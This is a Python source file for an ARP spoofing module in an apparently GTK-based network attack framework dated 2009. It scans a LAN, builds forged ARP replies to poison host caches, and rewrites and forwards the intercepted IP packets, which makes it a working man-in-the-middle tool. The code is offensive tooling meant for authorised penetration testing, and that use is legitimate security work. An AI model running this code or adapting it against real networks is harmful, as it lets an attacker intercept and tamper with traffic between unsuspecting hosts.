#       module_arp.py
#       
#       Copyright 2009 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import random
import threading
import time

import dpkt
import pcap
import dnet

import IPy

import gobject
import gtk
import gtk.glade

class spoof_thread(threading.Thread):
    def __init__(self, parent, delay):
        self.parent = parent
        self.delay = delay
        self.running = True
        threading.Thread.__init__(self)
        self.reset = False

    def run(self):
        self.parent.log("ARP: Spoof thread started")
        while self.running:
            if self.parent.dnet:
                for iter in self.parent.spoofs:
                    (run, entry, org_data, hosts) = self.parent.spoofs[iter]
                    if run:
                        for data in entry:
                            self.parent.dnet.send(data)
                            time.sleep(0.001)
            for x in xrange(self.delay):
                if not self.running:
                    break
                if self.reset:
                    self.reset = False
                    break
                time.sleep(1)
        for i in self.parent.spoofs:
            (run, data, org_data, hosts) = self.parent.spoofs[i]
            if run:
                for j in org_data:
                    self.parent.dnet.eth.send(j)
        self.parent.log("ARP: Spoof thread terminated")

    def wakeup(self):
        self.reset = True

    def quit(self):
        self.running = False

class mod_class(object):
    def __init__(self, parent, platform):
        self.parent = parent
        self.platform = platform
        self.name = "arp"
        self.gladefile = "/modules/module_arp.glade"
        self.macfile = "/modules/mac.txt"
        self.hosts_liststore = gtk.ListStore(str, str, str)
        self.upper_add_liststore = gtk.ListStore(str, str)
        self.lower_add_liststore = gtk.ListStore(str, str)
        self.spoof_treestore = gtk.TreeStore(gtk.gdk.Pixbuf, str, str, str)
        self.mappings_liststore = gtk.ListStore(str, str)
        self.dnet = None
        self.spoof_thread = None
        self.macs = None
        self.mac = None
    
    def start_mod(self):
        self.spoof_thread = spoof_thread(self, 30)
        self.hosts = {}
        self.upper_add = {}
        self.lower_add = {}
        self.spoofs = {}
        if not self.macs:
            self.macs = self.parse_macs(self.parent.data_dir + self.macfile)

    def shut_mod(self):
        if self.spoof_thread:
            self.spoof_thread.quit()
        self.hosts_liststore.clear()
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()
        self.spoof_treestore.clear()
        self.mappings_liststore.clear()

    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_add_upper_button_clicked" : self.on_add_upper_button_clicked,
                "on_add_lower_button_clicked" : self.on_add_lower_button_clicked,
                "on_add_spoof_button_clicked" : self.on_add_spoof_button_clicked,
                "on_clear_spoof_button_clicked" : self.on_clear_spoof_button_clicked,
                "on_remove_spoof_button_clicked" : self.on_remove_spoof_button_clicked,
                "on_stop_spoof_button_clicked" : self.on_stop_spoof_button_clicked,
                "on_start_spoof_button_clicked" : self.on_start_spoof_button_clicked,
                "on_scan_start_button_clicked" : self.on_scan_start_button_clicked
                }
        self.glade_xml.signal_autoconnect(dic)

        self.hosts_treeview = self.glade_xml.get_widget("hosts_treeview")
        self.hosts_treeview.set_model(self.hosts_liststore)
        self.hosts_treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Vendor")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.hosts_treeview.append_column(column)
        self.hosts_treeview.get_selection().set_mode(gtk.SELECTION_MULTIPLE)

        self.upper_add_treeview = self.glade_xml.get_widget("upper_add_treeview")
        self.upper_add_treeview.set_model(self.upper_add_liststore)
        self.upper_add_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.upper_add_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.upper_add_treeview.append_column(column)

        self.lower_add_treeview = self.glade_xml.get_widget("lower_add_treeview")
        self.lower_add_treeview.set_model(self.lower_add_liststore)
        self.lower_add_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.lower_add_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.lower_add_treeview.append_column(column)

        self.spoof_treeview = self.glade_xml.get_widget("spoof_treeview")
        self.spoof_treeview.set_model(self.spoof_treestore)
        self.spoof_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        render_pixbuf = gtk.CellRendererPixbuf()
        column.pack_start(render_pixbuf, expand=False)
        column.add_attribute(render_pixbuf, 'pixbuf', 0)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 3)
        self.spoof_treeview.append_column(column)

        self.mappings_treeview = self.glade_xml.get_widget("mappings_treeview")
        self.mappings_treeview.set_model(self.mappings_liststore)
        self.mappings_treeview.set_headers_visible(True)
        
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=False)
        column.add_attribute(render_text, 'text', 0)
        column.set_title("Real MAC")
        self.mappings_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        column.set_title("Random MAC")
        self.mappings_treeview.append_column(column)

        self.scan_network_entry = self.glade_xml.get_widget("scan_network_entry")

        self.offline = self.hosts_treeview.render_icon(gtk.STOCK_NO, 1)
        self.online = self.hosts_treeview.render_icon(gtk.STOCK_YES, 1)

        return self.glade_xml.get_widget("root")

    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def set_ip(self, ip, mask):
        self.scan_network_entry.set_text(str(IPy.IP("%s/%s" % (ip, mask), make_net=True)))
        self.ip = dnet.ip_aton(ip)

    def set_dnet(self, dnet_thread):
        self.dnet = dnet_thread
        self.mac = dnet_thread.eth.get()

    def get_eth_checks(self):
        return (self.check_eth, self.input_eth)

    def check_eth(self, eth):
        if eth.type == dpkt.ethernet.ETH_TYPE_ARP:
            return (True, True)
        return (False, False)

    def input_eth(self, eth, timestamp):
        arp = dpkt.arp.ARP(str(eth.data))
        mac = dnet.eth_ntoa(str(eth.src))
        if self.mac:
            if not eth.src == self.mac:
                if arp.op == dpkt.arp.ARP_OP_REQUEST:
                    ip_dst = dnet.eth_ntoa(str(arp.tha))
                    for h in self.hosts:
                        if mac == h:
                            (ip_src, rand_mac_src, iter_src, reply_src) = self.hosts[mac]
                            for i in self.hosts:
                                (ip, rand_mac_dst, iter_dst, reply_dst) = self.hosts[i]
                                if ip_dst == ip:
                                    break
                            if reply_src and reply_dst:
                                _arp = dpkt.arp.ARP(    hrd=dpkt.arp.ARP_HRD_ETH,
                                                        pro=dpkt.arp.ARP_PRO_IP,
                                                        op=dpkt.arp.ARP_OP_REPLY,
                                                        sha=dnet.eth_aton(rand_mac_dst),
                                                        spa=arp.tpa,
                                                        tha=arp.sha,
                                                        tpa=arp.spa
                                                        )
                                _eth = dpkt.ethernet.Ethernet(  dst=arp.sha,
                                                                src=dnet.eth_aton(rand_mac_dst),
                                                                type=dpkt.ethernet.ETH_TYPE_ARP,
                                                                data=str(_arp)
                                                                )
                                self.dnet.send(str(_eth))
                                break
        for h in self.hosts:
            if mac == h:
                return
            (ip, random_mac, iter, reply) = self.hosts[h]
            if mac == random_mac:
                return
        ip = dnet.ip_ntoa(str(arp.spa))
        rand_mac = [ 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff) ]
        rand_mac = ':'.join(map(lambda x: "%02x" % x, rand_mac))
        iter = self.hosts_liststore.append([mac, ip, self.mac_to_vendor(mac)])
        self.hosts[mac] = (ip, rand_mac, iter, False)
        self.mappings_liststore.append([mac, rand_mac])

    def get_ip_checks(self):
        return (self.check_ip, self.input_ip)

    def check_ip(self, ip):
        return (True, False)

    def input_ip(self, eth, ip, timestamp):
        src = dnet.eth_ntoa(str(eth.src))
        dst = dnet.eth_ntoa(str(eth.dst))
        good = False
        for h in self.hosts:
            (ip, rand_mac, iter, reply) = self.hosts[h]
            if src == h:
                eth.src = dnet.eth_aton(rand_mac)
                ref_src = ip
                if good:
                    self.dnet.send(str(eth))
                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                    return
                else:
                    good = True
            if dst == rand_mac:
                eth.dst = dnet.eth_aton(h)
                ref_dst = ip
                if good:
                    self.dnet.send(str(eth))
                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                    return
                else:
                    good = True

    def inc_packet_counter(self, model, path, iter, user_data):
        if model.iter_has_child(iter):
            return False
        (ref_src, ref_dst) = user_data
        (src, dst, count) = model.get(iter, 1, 2, 3)
        if (src == ref_src and dst == ref_dst) or (dst == ref_src and src == ref_dst):
            self.spoof_treestore.set(iter, 3, str(int(count) + 1))
            return True
        return False

    def parse_macs(self, file):
        macs = {}
        f = open(file, "r")
        for l in f:
            s = l.split()
            if len(s) < 2:
                continue
            macs[s[0]] = " ".join(s[1:])
        return macs

    def mac_to_vendor(self, mac):
        mac = mac.replace(":", "-")
        try:
            vendor = self.macs[mac[0:8].upper()]
        except:
            vendor = "Unknown"
        return vendor

    # SIGNALS #

    def on_add_upper_button_clicked(self, data):
        select = self.hosts_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            host = model.get_value(model.get_iter(i), 0)
            if host not in self.upper_add:
                if host not in self.lower_add:
                    (ip, rand_mac, iter, reply) = self.hosts[host]
                    iter = self.upper_add_liststore.append([host, ip])
                    self.upper_add[host] = (ip, rand_mac, iter)

    def on_add_lower_button_clicked(self, data):
        select = self.hosts_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            host = model.get_value(model.get_iter(i), 0)
            if host not in self.upper_add:
                if host not in self.lower_add:
                    (ip, rand_mac, iter, reply) = self.hosts[host]
                    iter = self.lower_add_liststore.append([host, ip])
                    self.lower_add[host] = (ip, rand_mac, iter)

    def on_add_spoof_button_clicked(self, data):
        if not len(self.upper_add):
            return
        if not len(self.lower_add):
            return
        parent = self.spoof_treestore.append(None, [self.offline, "%i spoofs" % (len(self.upper_add) * len(self.lower_add)), None, None])
        cur = self.spoof_treestore.get_string_from_iter(parent)
        data = []
        org_data = []
        hosts = []
        for host_upper in self.upper_add:
            (ip_upper, rand_mac_upper, iter_upper) = self.upper_add[host_upper]
            for host_lower in self.lower_add:
                (ip_lower, rand_mac_lower, iter_lower) = self.lower_add[host_lower]
                self.spoof_treestore.append(parent, [None, ip_upper, ip_lower, "0"])
                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                    pro=dpkt.arp.ARP_PRO_IP,
                                    op=dpkt.arp.ARP_OP_REPLY,
                                    sha=dnet.eth_aton(rand_mac_upper),
                                    spa=dnet.ip_aton(ip_upper),
                                    tpa=dnet.ip_aton(ip_lower)
                                    )
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_lower),
                                                src=dnet.eth_aton(rand_mac_upper),
                                                type=dpkt.ethernet.ETH_TYPE_ARP,
                                                data=str(arp)
                                                )
                data.append(str(eth))
                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                    pro=dpkt.arp.ARP_PRO_IP,
                                    op=dpkt.arp.ARP_OP_REPLY,
                                    sha=dnet.eth_aton(host_upper),
                                    spa=dnet.ip_aton(ip_upper),
                                    tpa=dnet.ip_aton(ip_lower)
                                    )
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_lower),
                                                src=dnet.eth_aton(host_upper),
                                                type=dpkt.ethernet.ETH_TYPE_ARP,
                                                data=str(arp)
                                                )
                org_data.append(str(eth))

                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                    pro=dpkt.arp.ARP_PRO_IP,
                                    op=dpkt.arp.ARP_OP_REPLY,
                                    sha=dnet.eth_aton(rand_mac_lower),
                                    spa=dnet.ip_aton(ip_lower),
                                    tpa=dnet.ip_aton(ip_upper)
                                    )
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_upper),
                                                src=dnet.eth_aton(rand_mac_lower),
                                                type=dpkt.ethernet.ETH_TYPE_ARP,
                                                data=str(arp)
                                                )
                data.append(str(eth))
                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                    pro=dpkt.arp.ARP_PRO_IP,
                                    op=dpkt.arp.ARP_OP_REPLY,
                                    sha=dnet.eth_aton(host_lower),
                                    spa=dnet.ip_aton(ip_lower),
                                    tpa=dnet.ip_aton(ip_upper)
                                    )
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_upper),
                                                src=dnet.eth_aton(host_lower),
                                                type=dpkt.ethernet.ETH_TYPE_ARP,
                                                data=str(arp)
                                                )
                org_data.append(str(eth))
            hosts.append(host_upper)
        for host_lower in self.lower_add:
            hosts.append(host_lower)
        self.spoofs[cur] = (False, data, org_data, hosts)
        self.upper_add = {}
        self.lower_add = {}
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()

    def on_clear_spoof_button_clicked(self, data):
        self.upper_add = {}
        self.lower_add = {}
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()

    def on_remove_spoof_button_clicked(self, data):
        self.on_stop_spoof_button_clicked(data)
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            del self.spoofs[model.get_string_from_iter(parent)]
            model.remove(parent)

    def on_stop_spoof_button_clicked(self, data):
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            self.spoof_treestore.set_value(parent, 0, self.offline)
            cur = self.spoof_treestore.get_string_from_iter(parent)
            (run, data, org_data, hosts) = self.spoofs[cur]
            if run:
                self.spoofs[cur] = (False, data, org_data, hosts)
                for j in org_data:
                    self.dnet.eth.send(j)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, False)

    def on_start_spoof_button_clicked(self, data):
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            self.spoof_treestore.set_value(parent, 0, self.online)
            cur = self.spoof_treestore.get_string_from_iter(parent)
            (run, data, org_data, hosts) = self.spoofs[cur]
            self.spoofs[cur] = (True, data, org_data, hosts)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, True)
        if not self.spoof_thread.is_alive():
            self.spoof_thread.start()
        self.spoof_thread.wakeup()

    def on_scan_start_button_clicked(self, data):
        ips = IPy.IP(self.scan_network_entry.get_text())
        for i in ips:
            arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                pro=dpkt.arp.ARP_PRO_IP,
                                op=dpkt.arp.ARP_OP_REQUEST,
                                sha=self.mac,
                                spa=self.ip,
                                tpa=dnet.ip_aton(str(i))
                                )
            eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton("ff:ff:ff:ff:ff:ff"),
                                            src=self.mac,
                                            type=dpkt.ethernet.ETH_TYPE_ARP,
                                            data=str(arp)
                                            )
            self.dnet.eth.send(str(eth))

